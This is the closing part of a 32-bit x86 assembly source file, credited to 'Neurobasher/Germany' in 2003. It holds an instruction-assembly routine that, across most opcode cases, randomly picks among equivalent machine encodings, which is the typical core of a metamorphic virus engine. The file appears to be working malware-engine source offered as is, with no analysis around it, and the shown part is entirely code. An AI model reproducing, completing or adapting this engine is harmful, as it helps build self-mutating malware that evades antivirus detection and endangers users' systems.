                mov     edx, [esi+7]    
                jmp   @@Assemble_OPRegReg_Next00 
     @@Assemble_OPRegReg_Inversed:
                add     ebx, 2          
     @@Assemble_OPRegReg_Inversed_2:
                mov     ecx, [esi+7]    
                mov     edx, [esi+1]    
     @@Assemble_OPRegReg_Next00:
                mov     [edi], ebx      
                mov     eax, ecx        
                shl     eax, 3          
                add     eax, 0C0h       
                add     eax, edx        
                mov     [edi+1], eax    
                add     edi, 2          
                ret

     @@Assemble_OPRegMem:
                cmp     ebx, 38h                   
                jbe   @@Assemble_OPRegMem_Normal   
                cmp     ebx, 40h                   
                jz    @@Assemble_MOVRegMem         
     @@Assemble_TESTRegMem:                      
                mov     ebx, 85h                 
                jmp   @@Assemble_OPRegMem_Normal_00
     @@Assemble_MOVRegMem:
                mov     ebx, 88h     
     @@Assemble_OPRegMem_Normal:
                add     ebx, 3
     @@Assemble_OPRegMem_Normal_00:
                mov     [edi], ebx         
                add     edi, 1
                mov     ebx, [esi+7]       
                and     ebx, 7             
                shl     ebx, 3             
                call    Asm_MakeMemoryAddress  
                ret

     @@Assemble_OPMemReg:
                cmp     ebx, 38h           
                jbe   @@Assemble_OPMemReg_Normal
                cmp     ebx, 40h            
                jnz   @@Assemble_TESTRegMem 
     @@Assemble_MOVMemReg:
                mov     ebx, 88h                           
     @@Assemble_OPMemReg_Normal:
                add     ebx, 1
                jmp   @@Assemble_OPRegMem_Normal_00

     @@Assemble_INCDECReg:
                call    Random
                and     eax, 1
                jz    @@Assemble_INCDECReg_2   
       @@Assemble_INCDECReg_1:
                mov     eax, [esi+7]       
                add     eax, 40h           
       @@Assemble_INCDECReg_Common:
                add     eax, [esi+1]       
                mov     [edi], eax         
                add     edi, 1
                ret
       @@Assemble_INCDECReg_2:
                mov     eax, 0FFh         
       @@Assemble_INCDECReg_2_8b:
                mov     [edi], eax        
                add     edi, 1
                mov     eax, [esi+7]      
                add     eax, 0C0h         
                jmp   @@Assemble_INCDECReg_Common 
     @@Assemble_INCDECReg_8b:
                mov     eax, 0FEh          
                jmp   @@Assemble_INCDECReg_2_8b

     @@Assemble_INCDECMem:
                mov     eax, 0FFh    
     @@Assemble_INCDECMem_2_8b:      
                mov     [edi], eax    
                add     edi, 1
                mov     ebx, [esi+7]  
                call    Asm_MakeMemoryAddress 
                ret                           
     @@Assemble_INCDECMem_8b:
                mov     eax, 0FEh    
                jmp   @@Assemble_INCDECMem_2_8b


     @@Assemble_Next00:
                cmp     eax, 4Eh       
                jz    @@Assemble_INCDECReg
                cmp     eax, 4Eh+80h   
                jz    @@Assemble_INCDECReg_8b
                cmp     eax, 4Fh       
                jz    @@Assemble_INCDECMem
                cmp     eax, 4Fh+80h   
                jz    @@Assemble_INCDECMem_8b


     @@Assemble_Next00_:               
                cmp     eax, 00h+80h
                jb    @@Assemble_Next01
                cmp     eax, 4Ch+80h
                ja    @@Assemble_Next01
                mov     ebx, eax       
                and     ebx, 78h
                and     eax, 7
                or      eax, eax              
                jz    @@Assemble_OP8RegImm
                cmp     eax, 1                
                jz    @@Assemble_OP8RegReg
                cmp     eax, 2                
                jz    @@Assemble_OP8RegMem
                cmp     eax, 3                
                jz    @@Assemble_OP8MemReg
     @@Assemble_OP8MemImm:                    
                cmp     ebx, 38h
                jbe   @@Assemble_OP8MemImm_Normal 
                cmp     ebx, 40h                  
                jz    @@Assemble_MOV8MemImm    
     @@Assemble_TEST8MemImm:                  
                xor     ebx, ebx
                mov     eax, 0F6h             
                call  @@Assemble_OPMemImm_Normal_00  
                sub     edi, 3                
                ret                           
     @@Assemble_MOV8MemImm:
                xor     ebx, ebx           
                mov     eax, 0C6h          
                call  @@Assemble_OPMemImm_Normal_00
                sub     edi, 3
                ret
     @@Assemble_OP8MemImm_Normal:
                call    Random             
                and     eax, 2             
                add     eax, 80h
                call  @@Assemble_OPMemImm_Normal_00
                sub     edi, 3
                ret

     @@Assemble_OP8RegImm:
                cmp     ebx, 38h           
                jbe   @@Assemble_OP8RegImm_Normal
                cmp     ebx, 40h                 
                jz    @@Assemble_MOV8RegImm
     @@Assemble_TEST8RegImm:                     
                mov     eax, [esi+1]             
                and     eax, 7
                or      eax, eax                 
                jnz   @@Assemble_TEST8RegImm_NotEAX 
                call    Random
                and     eax, 1
                jz    @@Assemble_TEST8RegImm_NotEAX
                mov     eax, 0A8h
                call  @@Assemble_OPRegImm_OneByteOpcode
                sub     edi, 3
                ret
     @@Assemble_TEST8RegImm_NotEAX:              
                mov     eax, 0F6h                
                xor     ebx, ebx                 
                call  @@Assemble_OPRegImm_Normal_01   
                sub     edi, 3                   
                ret
     @@Assemble_MOV8RegImm:
                call    Random
                and     eax, 1
                jz    @@Assemble_MOV8RegImm_OneByteOpcode 
                mov     eax, 0C6h                
                xor     ebx, ebx                 
                call  @@Assemble_OPRegImm_Normal_01
                sub     edi, 3
                ret
     @@Assemble_MOV8RegImm_OneByteOpcode:
                mov     eax, [esi+1]
                add     eax, 0B0h                
                call  @@Assemble_OPRegImm_OneByteOpcode
                sub     edi, 3
                ret
     @@Assemble_OP8RegImm_Normal:
                mov     eax, [esi+1]             
                and     eax, 7                   
                or      eax, eax                 
                jnz   @@Assemble_OP8RegImm_Normal_00
                call    Random
                and     eax, 1
                jz    @@Assemble_OP8RegImm_Normal_00 
                mov     eax, ebx                 
                add     eax, 4                   
                call  @@Assemble_OPRegImm_OneByteOpcode 
                sub     edi, 3
                ret
     @@Assemble_OP8RegImm_Normal_00:
                call    Random            
                and     eax, 2            
                add     eax, 80h          
                call  @@Assemble_OPRegImm_Normal_01
                sub     edi, 3
                ret

     @@Assemble_OP8RegReg:
                cmp     ebx, 38h          
                jbe   @@Assemble_OP8RegReg_Normal
                cmp     ebx, 40h
                jz    @@Assemble_MOV8RegReg
     @@Assemble_TEST8RegReg:              
                mov     ebx, 84h          
                jmp   @@Assemble_TEST8RegReg_00
     @@Assemble_MOV8RegReg:
                mov     ebx, 88h          
                jmp   @@Assemble_OP8RegReg_Normal


     @@Assemble_OP8RegMem:
                cmp     ebx, 38h          
                jbe   @@Assemble_OP8RegMem_Normal
                cmp     ebx, 40h
                jz    @@Assemble_MOV8RegMem
     @@Assemble_TEST8RegMem:
                mov     ebx, 84h          
                jmp   @@Assemble_OPRegMem_Normal_00
     @@Assemble_MOV8RegMem:
                mov     ebx, 88h          
     @@Assemble_OP8RegMem_Normal:
                add     ebx, 2
                jmp   @@Assemble_OPRegMem_Normal_00


     @@Assemble_OP8MemReg:
                cmp     ebx, 38h          
                jbe   @@Assemble_OPRegMem_Normal_00
                cmp     ebx, 40h          
                jnz   @@Assemble_TEST8RegMem
     @@Assemble_MOV8MemReg:
                mov     ebx, 88h          
                jmp   @@Assemble_OPRegMem_Normal_00

     @@Assemble_Next01:
                cmp     eax, 50h          
                jnz   @@Assemble_Next02
                call    Random
                and     eax, 1
                jz    @@Assemble_PUSHReg_2 
     @@Assemble_PUSHReg_1:
                mov     eax, [esi]        
                and     eax, 0FFh
                mov     ebx, [esi+1]      
                add     eax, ebx
     @@Assemble_StoreByte:
                mov     [edi], eax        
                add     edi, 1
                ret
     @@Assemble_PUSHReg_2:
                mov     eax, 0FFh         
                mov     [edi], eax        
                mov     eax, [esi+1]
                add     eax, 0F0h
                mov     [edi+1], eax
                add     edi, 2
                ret

     @@Assemble_Next02:
                cmp     eax, 58h          
                jnz   @@Assemble_Next03
                call    Random
                and     eax, 1
                jz    @@Assemble_PUSHReg_1  
     @@Assemble_POPReg_2:
                mov     eax, 8Fh          
                mov     [edi], eax        
                mov     eax, [esi+1]
                add     eax, 0C0h
                mov     [edi+1], eax
                add     edi, 2
                ret

     @@Assemble_Next03:
                cmp     eax, 51h          
                jnz   @@Assemble_Next04
                mov     eax, 0FFh         
                mov     ebx, 30h
     @@Assemble_POPMem:
                mov     [edi], eax        
                add     edi, 1
                call    Asm_MakeMemoryAddress 
                ret

     @@Assemble_Next04:
                cmp     eax, 59h          
                jnz   @@Assemble_Next05
                mov     eax, 8Fh          
                xor     ebx, ebx
                jmp   @@Assemble_POPMem


     @@Assemble_Next05:
                cmp     eax, 68h          
                jnz   @@Assemble_Next06
                mov     [edi], eax        
                mov     eax, [esi+7]      
                cmp     eax, 7Fh
                jbe   @@Assemble_PUSHImm_Byte  
                cmp     eax, 0FFFFFF80h        
                jae   @@Assemble_PUSHImm_Byte
     @@Assemble_PUSHImm_Dword:
                mov     [edi+1], eax     
                add     edi, 5           
                ret
     @@Assemble_PUSHImm_Byte:
                push    eax              
                call    Random
                and     eax, 1
                pop     eax
                or      ebx, ebx
                jz    @@Assemble_PUSHImm_Dword
                mov     ebx, 6Ah         
                mov     [edi], ebx
                mov     [edi+1], eax     
                add     edi, 2
                ret

     @@Assemble_Next06:
                cmp     eax, 0E0h        
                jnz   @@Assemble_Next07
                mov     ebx, 0D0h        
     @@Assemble_NEG32Reg:
                mov     eax, 0F7h        
     @@Assemble_Nxx8Reg:
                mov     [edi], eax       
                mov     eax, [esi+1]
                add     eax, ebx         
                mov     [edi+1], eax     
                add     edi, 2
                ret

     @@Assemble_Next07:
                cmp     eax, 0E4h        
                jnz   @@Assemble_Next08
                mov     ebx, 0D8h        
                jmp   @@Assemble_NEG32Reg

     @@Assemble_Next08:
                cmp     eax, 0E2h        
                jnz   @@Assemble_Next09
                mov     ebx, 0D0h        
     @@Assemble_NEG8Reg:
                mov     eax, 0F6h        
                jmp   @@Assemble_Nxx8Reg

     @@Assemble_Next09:
                cmp     eax, 0E6h        
                jnz   @@Assemble_Next10
                mov     ebx, 0D8h        
                jmp   @@Assemble_NEG8Reg


     @@Assemble_Next10:
                cmp     eax, 0E1h        
                jnz   @@Assemble_Next11
                mov     ebx, 10h         
     @@Assemble_NEG32Mem:
                mov     eax, 0F7h        
     @@Assemble_Nxx8Mem:
                mov     [edi], eax       
                add     edi, 1
                call    Asm_MakeMemoryAddress 
                ret                       

     @@Assemble_Next11:
                cmp     eax, 0E5h        
                jnz   @@Assemble_Next12
                mov     ebx, 18h         
                jmp   @@Assemble_NEG32Mem 

     @@Assemble_Next12:
                cmp     eax, 0E3h        
                jnz   @@Assemble_Next13
                mov     ebx, 10h         
     @@Assemble_NEG8Mem:
                mov     eax, 0F6h        
                jmp   @@Assemble_Nxx8Mem

     @@Assemble_Next13:
                cmp     eax, 0E7h        
                jnz   @@Assemble_Next14
                mov     ebx, 18h         
                jmp   @@Assemble_NEG8Mem 

     @@Assemble_Next14:
                cmp     eax, 0EAh        
                jnz   @@Assemble_Next15
                mov     eax, 0FFh        
                mov     ebx, 10h
                jmp   @@Assemble_Nxx8Mem 

     @@Assemble_Next15:
                cmp     eax, 0EBh        
                jnz   @@Assemble_Next16
                mov     eax, 0FFh        
                mov     ebx, 20h         
                jmp   @@Assemble_Nxx8Mem

     @@Assemble_Next16:
                cmp     eax, 0ECh        
                jnz   @@Assemble_Next17
                mov     eax, 0FFh        
                mov     ebx, 0D0h        
                jmp   @@Assemble_Nxx8Reg 
                                        
                                        
                                        
     @@Assemble_Next17:
                cmp     eax, 0EDh       
                jnz   @@Assemble_Next18
                mov     eax, 0FFh       
                mov     ebx, 0E0h       
                jmp   @@Assemble_Nxx8Reg


     @@Assemble_Next18:
                cmp     eax, 0F0h       
                jnz   @@Assemble_Next19
                mov     eax, [esi+7]    
                and     eax, 0FFh
                cmp     eax, 1          
                jz    @@Assemble_SHIFT_1
     @@Assemble_SHIFT_2:
                mov     ecx, 0C1h       
                mov     edx, 0E0h       
     @@Assemble_SHIFT8_1_00:            
                call  @@Assemble_SHIFT_x
                mov     ebx, [esi+7]    
                and     ebx, 0FFh
                call    Random   
                and     eax, edx 
                add     eax, ebx        
                mov     [edi], eax      
                add     edi, 1
                ret                     
     @@Assemble_SHIFT_1:
                call    Random
                and     eax, 1
                jz    @@Assemble_SHIFT_2
                mov     ecx, 0D1h       
     @@Assemble_SHIFT_x:
                mov     [edi], ecx      
                add     edi, 1
                mov     ebx, [esi+8]    
                and     ebx, 8          
                add     ebx, 0C0h       
                call    Random          
                and     eax, 20h        
                add     ebx, eax        
                mov     eax, [esi+1]    
                and     eax, 7
                add     eax, ebx        
                mov     [edi], eax      
                add     edi, 1
                ret

     @@Assemble_Next19:
                cmp     eax, 0F2h       
                jnz   @@Assemble_Next20
                mov     eax, [esi+7]    
                and     eax, 0FFh       
                cmp     eax, 1          
                jz    @@Assemble_SHIFT8_1
     @@Assemble_SHIFT8_2:
                mov     ecx, 0C0h       
                xor     edx, edx        
                jmp   @@Assemble_SHIFT8_1_00 
     @@Assemble_SHIFT8_1:
                call    Random
                and     eax, 1
                jz    @@Assemble_SHIFT8_2
                mov     ecx, 0D0h       
                jmp   @@Assemble_SHIFT_x 


     @@Assemble_Next20:
                cmp     eax, 0F1h       
                jnz   @@Assemble_Next21
                mov     eax, [esi+7]
                and     eax, 0FFh       
                cmp     eax, 1          
                jz    @@Assemble_SHIFTMem_1
     @@Assemble_SHIFTMem_2:
                mov     ecx, 0C1h       
                mov     edx, 0E0h
     @@Assemble_SHIFT8Mem_1_00:
                push    edx             
                call  @@Assemble_SHIFTMem_x
                pop     edx             
                mov     ebx, [esi+7]    
                and     ebx, 0FFh       
                call    Random          
                and     eax, edx
                add     eax, ebx
                mov     [edi], eax
                add     edi, 1
                ret
     @@Assemble_SHIFTMem_1:
                call    Random          
                or      eax, eax
                jz    @@Assemble_SHIFTMem_2 
                mov     ecx, 0D1h       
     @@Assemble_SHIFTMem_x:
                mov     [edi], ecx      
                add     edi, 1
                mov     ebx, [esi+8]    
                and     ebx, 8
                call    Random
                and     eax, 20h        
                add     ebx, eax        
                call    Asm_MakeMemoryAddress 
                ret                           

     @@Assemble_Next21:
                cmp     eax, 0F3h       
                jnz   @@Assemble_Next22
                mov     eax, [esi+7]    
                and     eax, 0FFh       
                cmp     eax, 1          
                jz    @@Assemble_SHIFT8Mem_1 
     @@Assemble_SHIFT8Mem_2:                 
                mov     ecx, 0C0h            
                xor     edx, edx             
                jmp   @@Assemble_SHIFT8Mem_1_00
     @@Assemble_SHIFT8Mem_1:
                call    Random
                and     eax, 1
                jz    @@Assemble_SHIFT8Mem_2
                mov     ecx, 0D0h
                jmp   @@Assemble_SHIFTMem_x

     @@Assemble_Next22:
                cmp     eax, 0FCh       
                jnz   @@Assemble_Next23
                mov     eax, 8Dh        
                mov     [edi], eax      
                add     edi, 1          
                mov     ebx, [esi+7]
                and     ebx, 7
                shl     ebx, 3
                call    Asm_MakeMemoryAddress
                ret

     @@Assemble_Next23:
                cmp     eax, 0FDh       
                jnz   @@Assemble_Next24
                mov     eax, [esi+1]    
                jmp   @@Assemble_StoreByte

     @@Assemble_Next24:
                cmp     eax, 0FEh       
                jnz   @@Assemble_Next25
                mov     eax, 0C3h       
                jmp   @@Assemble_StoreByte

     @@Assemble_Next25:
                cmp     eax, 0FFh       
                jnz   @@Assemble_Next26
                mov     eax, 90h        
                jmp   @@Assemble_StoreByte

     @@Assemble_Next26:
                cmp     eax, 70h        
                jb    @@Assemble_Next27
                cmp     eax, 7Fh
                ja    @@Assemble_Next27
                mov     eax, [esi+7]    
                or      eax, eax        
                jz    @@Assemble_Jump_Normal
                mov     eax, [esi]      
                xor     eax, 1
                mov     [edi], eax      
                add     edi, 1          
                push    edi             
                add     edi, 1
                mov     eax, 0E9h       
                mov     [esi], al
                call  @@Assemble_Jump_Normal
                pop     ebx             
                mov     eax, edi        
                sub     eax, ebx        
                sub     eax, 1          
                mov     [ebx], al       
                ret


     @@Assemble_Next27:
                cmp     eax, 0F8h       
                jnz   @@Assemble_Next28
                mov     eax, 0B60Fh     
                mov     [edi], eax
                add     edi, 2
                mov     ebx, [esi+7]    
                and     ebx, 7          
                shl     ebx, 3          
                call    Asm_MakeMemoryAddress
                ret

     @@Assemble_Next28:               


     @@Assemble_Jump_Normal:
                mov     ebx, [esi+1]    
                mov     eax, [ebx+4]    
                cmp     eax, esi        
                jb    @@Assemble_Jump_Backwards
     @@Assemble_Jump_Fowards:
                mov     ebx, eax        
                sub     ebx, esi
                cmp     ebx, 0B0h 
                                  
                jbe   @@Assemble_JmpFwd_Short
     @@Assemble_JmpFwd_Long_Set00:
                mov     eax, [esi]          
                and     eax, 0FFh
                cmp     eax, 7Fh            
                jbe   @@Assemble_JmpFwd_Long_Jcc
     @@Assemble_JmpFwd_Long_Set:
                mov     [edi], eax          
                call    Asm_AddToRelocTable 
                add     edi, 5              
                ret
     @@Assemble_JmpFwd_Long_Jcc:
                mov     eax, 0Fh         
                mov     [edi], eax
                add     edi, 1
                mov     eax, [esi]       
                add     eax, 10h         
                jmp   @@Assemble_JmpFwd_Long_Set 
                                                 
     @@Assemble_JmpFwd_Short:
                call    Random           
                and     eax, 4           
                or      eax, eax         
                jz    @@Assemble_JmpFwd_Long_Set00
                mov     eax, [esi]       
                and     eax, 0FFh
                cmp     eax, 0E8h                 
                jz    @@Assemble_JmpFwd_Long_Set  
                cmp     eax, 0E9h                 
                jz    @@Assemble_JmpFwd_Short_JMP 
     @@Assemble_JmpFwd_Short_Set:
                mov     [edi], eax                
                call    Asm_AddToRelocTable       
                add     edi, 2                    
                ret
     @@Assemble_JmpFwd_Short_JMP:
                add     eax, 2            
                jmp   @@Assemble_JmpFwd_Short_Set

     @@Assemble_Jump_Backwards:
                mov     ebx, [eax+0Ch]    
                sub     ebx, edi
                sub     ebx, 2            
                cmp     ebx, 0FFFFFF80h   
                jb    @@Assemble_Jump_Backwards_Long 
                                                     
                mov     eax, [esi]        
                cmp     al, 0E8h          
                jz    @@Assemble_Jump_Backwards_Long 
                                                   
                call    Random
                and     eax, 7
                or      eax, eax          
                jz    @@Assemble_Jump_Backwards_Long 
                mov     eax, [esi]
                cmp     al, 0E9h          
                jnz   @@Assemble_Jump_StoreOpcode_Short 
                add     eax, 2                          
     @@Assemble_Jump_StoreOpcode_Short:
                mov     [edi], eax        
                add     edi, 1
                mov     [edi], ebx        
                add     edi, 1
                ret
     @@Assemble_Jump_Backwards_Long:
                mov     eax, [esi]        
                cmp     al, 0E9h                     
                jz    @@Assemble_Jump_Backwards_JMP  
                cmp     al, 0E8h                     
                jz    @@Assemble_Jump_Backwards_JMP  
                sub     ebx, 4           
                mov     eax, 0Fh         
                mov     [edi], eax      
                add     edi, 1
                mov     eax, [esi]       
                add     eax, 10h
     @@Assemble_Jump_Backwards_Long_Common:
                mov     [edi], eax       
                add     edi, 1
                mov     [edi], ebx       
                add     edi, 4
                ret
     @@Assemble_Jump_Backwards_JMP:
                sub     ebx, 3           
                jmp   @@Assemble_Jump_Backwards_Long_Common
                ret
AssembleInstruction endp

EndOfCode       label   dword

                end     PreMain

(c) Neurobasher/Germany, somewhere on April 2003 

